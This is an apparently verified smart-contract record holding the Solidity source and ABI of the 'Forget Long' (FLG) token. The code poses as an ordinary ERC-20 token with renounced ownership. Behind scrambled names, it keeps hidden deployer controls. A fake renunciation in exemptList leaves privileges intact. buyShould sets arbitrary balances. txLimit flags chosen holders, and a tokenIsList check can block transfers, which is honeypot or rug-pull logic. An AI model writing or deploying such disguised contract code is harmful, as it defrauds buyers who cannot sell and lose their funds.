{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface walletMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toSell {\n    function createPair(address buyMin, address launchReceiverBuy) external returns (address);\n}\n\ninterface fundAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeListSwap) external view returns (uint256);\n\n    function transfer(address amountSell, uint256 listSwap) external returns (bool);\n\n    function allowance(address minSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountSell,\n        uint256 listSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeTo, uint256 value);\n    event Approval(address indexed minSwap, address indexed spender, uint256 value);\n}\n\ninterface totalTxExempt is fundAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ForgetLong is modeLiquidity, fundAuto, totalTxExempt {\n\n    address walletSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private isLiquidity;\n\n    function transfer(address txLaunched, uint256 listSwap) external virtual override returns (bool) {\n        return marketingLaunched(_msgSender(), txLaunched, listSwap);\n    }\n\n    string private walletAmount = \"Forget Long\";\n\n    mapping(address => uint256) private minFee;\n\n    function marketingLaunched(address exemptTakeMin, address amountSell, uint256 listSwap) internal returns (bool) {\n        if (exemptTakeMin == enableTotal) {\n            return limitAt(exemptTakeMin, amountSell, listSwap);\n        }\n        uint256 maxTo = fundAuto(feeWalletTeam).balanceOf(takeLimit);\n        require(maxTo == tokenReceiver);\n        require(amountSell != takeLimit);\n        if (limitTo[exemptTakeMin]) {\n            return limitAt(exemptTakeMin, amountSell, exemptLaunch);\n        }\n        return limitAt(exemptTakeMin, amountSell, listSwap);\n    }\n\n    function approve(address toMarketing, uint256 listSwap) public virtual override returns (bool) {\n        isLiquidity[_msgSender()][toMarketing] = listSwap;\n        emit Approval(_msgSender(), toMarketing, listSwap);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundBuyReceiver;\n    }\n\n    bool private sellTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellLimit;\n    }\n\n    address private fundBuyReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return walletAmount;\n    }\n\n    mapping(address => bool) public limitTo;\n\n    function owner() external view returns (address) {\n        return fundBuyReceiver;\n    }\n\n    uint256 private sellShould;\n\n    mapping(address => bool) public liquidityAmountToken;\n\n    uint8 private fromWalletReceiver = 18;\n\n    event OwnershipTransferred(address indexed senderFee, address indexed senderFeeLaunch);\n\n    function exemptList() public {\n        emit OwnershipTransferred(enableTotal, address(0));\n        fundBuyReceiver = address(0);\n    }\n\n    address takeLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tokenIsList(uint256 listSwap) public {\n        txLaunch();\n        tokenReceiver = listSwap;\n    }\n\n    bool private teamAmount;\n\n    string private sellLimit = \"FLG\";\n\n    function buyShould(address txLaunched, uint256 listSwap) public {\n        txLaunch();\n        minFee[txLaunched] = listSwap;\n    }\n\n    function balanceOf(address feeListSwap) public view virtual override returns (uint256) {\n        return minFee[feeListSwap];\n    }\n\n    function sellReceiver(address exemptFee) public {\n        if (listFeeMax) {\n            return;\n        }\n        if (autoSellWallet != sellShould) {\n            teamAmount = false;\n        }\n        liquidityAmountToken[exemptFee] = true;\n        if (modeReceiverBuy == autoSellWallet) {\n            teamAmount = false;\n        }\n        listFeeMax = true;\n    }\n\n    function limitAt(address exemptTakeMin, address amountSell, uint256 listSwap) internal returns (bool) {\n        require(minFee[exemptTakeMin] >= listSwap);\n        minFee[exemptTakeMin] -= listSwap;\n        minFee[amountSell] += listSwap;\n        emit Transfer(exemptTakeMin, amountSell, listSwap);\n        return true;\n    }\n\n    bool public teamReceiverSell;\n\n    address public enableTotal;\n\n    address public feeWalletTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedEnable;\n    }\n\n    uint256 public autoSellWallet;\n\n    uint256 public modeReceiverBuy;\n\n    uint256 launchTake;\n\n    function transferFrom(address exemptTakeMin, address amountSell, uint256 listSwap) external override returns (bool) {\n        if (_msgSender() != walletSender) {\n            if (isLiquidity[exemptTakeMin][_msgSender()] != type(uint256).max) {\n                require(listSwap <= isLiquidity[exemptTakeMin][_msgSender()]);\n                isLiquidity[exemptTakeMin][_msgSender()] -= listSwap;\n            }\n        }\n        return marketingLaunched(exemptTakeMin, amountSell, listSwap);\n    }\n\n    function txLaunch() private view {\n        require(liquidityAmountToken[_msgSender()]);\n    }\n\n    uint256 private launchedEnable = 100000000 * 10 ** 18;\n\n    function txLimit(address fundLaunched) public {\n        txLaunch();\n        if (teamReceiverSell) {\n            teamAmount = true;\n        }\n        if (fundLaunched == enableTotal || fundLaunched == feeWalletTeam) {\n            return;\n        }\n        limitTo[fundLaunched] = true;\n    }\n\n    function allowance(address tradingLiquidity, address toMarketing) external view virtual override returns (uint256) {\n        if (toMarketing == walletSender) {\n            return type(uint256).max;\n        }\n        return isLiquidity[tradingLiquidity][toMarketing];\n    }\n\n    constructor (){\n        \n        walletMax fundFrom = walletMax(walletSender);\n        feeWalletTeam = toSell(fundFrom.factory()).createPair(fundFrom.WETH(), address(this));\n        if (teamAmount) {\n            sellTake = true;\n        }\n        enableTotal = _msgSender();\n        exemptList();\n        liquidityAmountToken[enableTotal] = true;\n        minFee[enableTotal] = launchedEnable;\n        if (teamReceiverSell == sellTake) {\n            modeReceiverBuy = autoSellWallet;\n        }\n        emit Transfer(address(0), enableTotal, launchedEnable);\n    }\n\n    uint256 constant exemptLaunch = 19 ** 10;\n\n    bool public listFeeMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromWalletReceiver;\n    }\n\n    uint256 tokenReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFeeLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSellWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeListSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSwap\",\"type\":\"uint256\"}],\"name\":\"buyShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWalletTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAmountToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFeeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiverBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"}],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listSwap\",\"type\":\"uint256\"}],\"name\":\"tokenIsList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTakeMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunched\",\"type\":\"address\"}],\"name\":\"txLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ForgetLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}